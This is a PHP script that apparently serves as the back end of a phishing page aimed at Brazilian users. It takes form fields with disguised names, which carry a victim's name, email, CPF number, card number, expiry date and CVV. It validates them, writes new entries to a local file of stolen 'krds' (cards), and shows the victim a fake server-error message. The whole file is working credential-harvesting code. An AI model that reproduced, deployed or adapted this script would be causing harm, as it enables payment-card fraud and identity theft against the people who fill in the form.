<?php

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

$date = date('d/m/Y');

if (
  isset($_POST['nama'],
  $_POST['emeil'],
  $_POST['cepefi'],
  $_POST['corton'],
  $_POST['mesano'],
  $_POST['ceveve'])
) {
  $nama = $_POST['nama'];
  $emeil = $_POST['emeil'];
  $cepefi = $_POST['cepefi'];
  $corton = $_POST['corton'];
  $mesano = $_POST['mesano'];
  $ceveve = $_POST['ceveve'];

  if (
    !empty($nama)
    && filter_var($emeil, FILTER_VALIDATE_EMAIL)
    && preg_match("/^((\d{3}).(\d{3}).(\d{3})-(\d{2}))*$/", $cepefi)
    && !empty($corton)
    && preg_match("/^((\d{2})\/(\d{4}))*$/", $mesano)
    && strlen($ceveve) <= 4
  ) {
    $file = fopen('./botmillion_krds.txt', 'a+');
    $content = ucfirst($nama) . ' | ' . strtolower($emeil) . ' | ' . $cepefi . ' | ' . $corton . ' | ' . $mesano . ' | ' . $ceveve . ' | ' . $date . "\n";
    
    $file_values = file_get_contents('./botmillion_krds.txt');

    if (
      !strpos($file_values, $corton) !== false &&
      !strpos($file_values, $mesano) !== false &&
      !strpos($file_values, $ceveve) !== false
    ) {
      fwrite($file, $content);
      fclose($file);
    }

    $obj = json_encode([
      "code" => 500,
      "status" => "INTERNAL_SERVER_ERROR"
    ]);

    echo $obj;
  }
}

?>